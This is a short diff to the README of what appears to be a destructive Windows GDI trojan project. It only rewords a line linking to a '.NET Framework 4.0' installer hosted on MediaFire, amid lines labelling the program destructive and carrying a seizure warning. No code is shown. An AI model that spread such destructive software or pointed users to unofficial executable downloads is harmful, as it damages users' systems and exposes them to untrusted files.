@@ -6,7 +6,7 @@
 ### Category: TrojanGdi.Win32
 ### Compatible Platforms: WinXP, WinVista, Win7, Win8.1, Win10, Win11.
 ### Execution Requirement: .NET Framework 4.0 
-### [LINK DOWNLOAD .NET 4.0 - https://www.mediafire.com/file/4jhlkaaeashxy1g/NetFramework4.exe/file]
+### [LINK DOWNLOAD (.NET 4.0) - https://www.mediafire.com/file/4jhlkaaeashxy1g/NetFramework4.exe/file]
 ### Destructive?- Yes
 ---------------------------------------------------------------------------
 ## ⊗ PHOTOSENSITIVE SEIZURE WARNING ⊗
